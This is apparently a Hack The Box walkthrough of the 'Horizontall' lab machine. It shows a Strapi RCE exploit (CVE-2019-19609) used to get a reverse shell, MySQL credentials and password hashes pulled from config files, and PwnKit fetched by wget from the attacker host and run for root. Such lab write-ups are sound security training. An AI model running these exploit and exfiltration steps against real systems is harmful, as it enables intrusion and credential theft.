---
tags:
  - hack
  - linux
---

# HTB: [Horizontall](https://app.hackthebox.com/machines/Horizontall)

> [!tip]- Summary with Spoilers
> - This machine exposed a web application running on `Horizontall` that allowed enumeration of an internal API using subdomain routing.
> - I exploited an outdated Laravel application on the internal API to gain access as `strapi`.
> - Privilege escalation was achieved using the `PwnKit` vulnerability (`CVE-2021-4034`), granting `root` access.

## Enumerate

Full `nmap` scan:

#nmap

```console
$ nmap -n -sVC -p- $t
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 15:31 CDT
Nmap scan report for 10.10.11.105
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3629.22 seconds
```

The web page running on port 80 calls `app.c68eb462.js`, and that calls `http://api-prod.horizontall.htb/reviews`. I add that vhost to `/etc/hosts` and grab its endpoint:

```console
$ curl -s http://api-prod.horizontall.htb/reviews |jq
[
  {
    "id": 1,
    "name": "wail",
    "description": "This is good service",
    "stars": 4,
    "created_at": "2021-05-29T13:23:38.000Z",
    "updated_at": "2021-05-29T13:23:38.000Z"
  },
  {
    "id": 2,
    "name": "doe",
    "description": "i'm satisfied with the product",
    "stars": 5,
    "created_at": "2021-05-29T13:24:17.000Z",
    "updated_at": "2021-05-29T13:24:17.000Z"
  },
  {
    "id": 3,
    "name": "john",
    "description": "create service with minimum price i hop i can buy more in the futur",
    "stars": 5,
    "created_at": "2021-05-29T13:25:26.000Z",
    "updated_at": "2021-05-29T13:25:26.000Z"
  }
]
```

`http://api-prod.horizontall.htb/`:

![](_/htb-horizontall-20231023-1.png)

## Exploit

[Strapi](https://strapi.io/) is "The leading open-source headless CMS". It also has a pre-auth RCE exploit: [CVE-2019-19609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-19609)

```console
$ curl https://raw.githubusercontent.com/glowbase/CVE-2019-19609/main/exploit.py -o x.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                         
                                 Dload  Upload   Total   Spent    Left  Speed
100  2544  100  2544    0     0   7684      0 --:--:-- --:--:-- --:--:--  7709

## Start nc listener in other pane.

$ python x.py http://api-prod.horizontall.htb 10.10.16.5 443
========================================================
|    STRAPI REMOTE CODE EXECUTION (CVE-2019-19609)     |
========================================================
[+] Checking Strapi CMS version
[+] Looks like this exploit should work!
[+] Executing exploit
```

Listener:

```console
$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.105] 46284
/bin/sh: 0: can't access tty; job control turned off
$ id        
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
$ pwd
/opt/strapi/myapi
$ ls -la
total 648
drwxr-xr-x    9 strapi strapi   4096 Jul 29  2021 .
drwxr-xr-x    9 strapi strapi   4096 Aug  2  2021 ..
drwxr-xr-x    3 strapi strapi   4096 May 29  2021 api
drwxrwxr-x    2 strapi strapi  12288 May 26  2021 build
drwxrwxr-x    5 strapi strapi   4096 May 26  2021 .cache
drwxr-xr-x    5 strapi strapi   4096 Jul 29  2021 config
-rw-r--r--    1 strapi strapi    249 May 26  2021 .editorconfig
-rw-r--r--    1 strapi strapi     32 May 26  2021 .eslintignore
-rw-r--r--    1 strapi strapi    541 May 26  2021 .eslintrc
drwxr-xr-x    3 strapi strapi   4096 May 26  2021 extensions
-rw-r--r--    1 strapi strapi   1150 May 26  2021 favicon.ico
-rw-r--r--    1 strapi strapi   1119 May 26  2021 .gitignore
drwxrwxr-x 1099 strapi strapi  36864 Aug  3  2021 node_modules
-rw-rw-r--    1 strapi strapi   1009 May 26  2021 package.json
-rw-rw-r--    1 strapi strapi 552845 May 26  2021 package-lock.json
drwxr-xr-x    3 strapi strapi   4096 Jun  2  2021 public
-rw-r--r--    1 strapi strapi     69 May 26  2021 README.md
$ ls /home
developer
$ ls -la /home/developer
total 108
drwxr-xr-x  8 developer developer  4096 Aug  2  2021 .
drwxr-xr-x  3 root      root       4096 May 25  2021 ..
lrwxrwxrwx  1 root      root          9 Aug  2  2021 .bash_history -> /dev/null
-rw-r-----  1 developer developer   242 Jun  1  2021 .bash_logout
-rw-r-----  1 developer developer  3810 Jun  1  2021 .bashrc
drwx------  3 developer developer  4096 May 26  2021 .cache
-rw-rw----  1 developer developer 58460 May 26  2021 composer-setup.php
drwx------  5 developer developer  4096 Jun  1  2021 .config
drwx------  3 developer developer  4096 May 25  2021 .gnupg
drwxrwx---  3 developer developer  4096 May 25  2021 .local
drwx------ 12 developer developer  4096 May 26  2021 myproject
-rw-r-----  1 developer developer   807 Apr  4  2018 .profile
drwxrwx---  2 developer developer  4096 Jun  4  2021 .ssh
-r--r--r--  1 developer developer    33 Oct 20 20:29 user.txt
lrwxrwxrwx  1 root      root          9 Aug  2  2021 .viminfo -> /dev/null
$ cat /home/developer/user.txt
653323[...]
```

From here I find MySQL credentials and some password hashes:

```console
$ pwd
/opt/strapi/myapi/

$ grep -R password config/*
config/environments/production/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",
config/environments/development/database.json:        "password": "#J!:F9Zt2u"
config/environments/staging/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",

$ cat config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}

$ mysql -u developer -p'#J!:F9Zt2u' -e"use strapi;show tables;"
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_strapi
core_store
reviews
strapi_administrator
upload_file
upload_file_morph
users-permissions_permission
users-permissions_role
users-permissions_user

$ mysql -u developer -p'#J!:F9Zt2u' -e"select * from strapi.strapi_administrator"
mysql: [Warning] Using a password on the command line interface can be insecure.
id      username        email   password        resetPasswordToken      blocked
3       admin   admin@horizontall.htb   $2a$10$/dPYxU8kpN0Fj4f0V7cUSOujdCtkiFCC73//Svx0a82X0aU3BBGKa    NULL    NULL
```

I copy these hashes to my machine and let `hashcat` auto-detect the hash types:

```console
$ hashcat hash_strapi ~/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 6747/13559 MB (2048 MB allocatable), 12MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
```

Tried all four hash types but hashing algorithm is computationally intensive.

## Escalate

Ultimately I abandon the approach of escalating privileges via the hashes I found, and instead find this easy path via PwnKit:

```console
strapi@horizontall:~$ ls -l `which pkexec`
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
strapi@horizontall:~$ cd /tmp/...
strapi@horizontall:/tmp/...$ wget http://10.10.16.5:8888/PwnKit
--2023-10-23 17:00:12--  http://10.10.16.5:8888/PwnKit
Connecting to 10.10.16.5:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                                        100%[=================================================================================================>]  17.62K  81.8KB/s    in 0.2s    

2023-10-23 17:00:13 (81.8 KB/s) - ‘PwnKit’ saved [18040/18040]

strapi@horizontall:/tmp/...$ chmod +x PwnKit 
strapi@horizontall:/tmp/...$ ./PwnKit 
root@horizontall:/tmp/...# id
uid=0(root) gid=0(root) groups=0(root),1001(strapi)
root@horizontall:/tmp/...# cat /root/root.txt
8914f5[...]
```
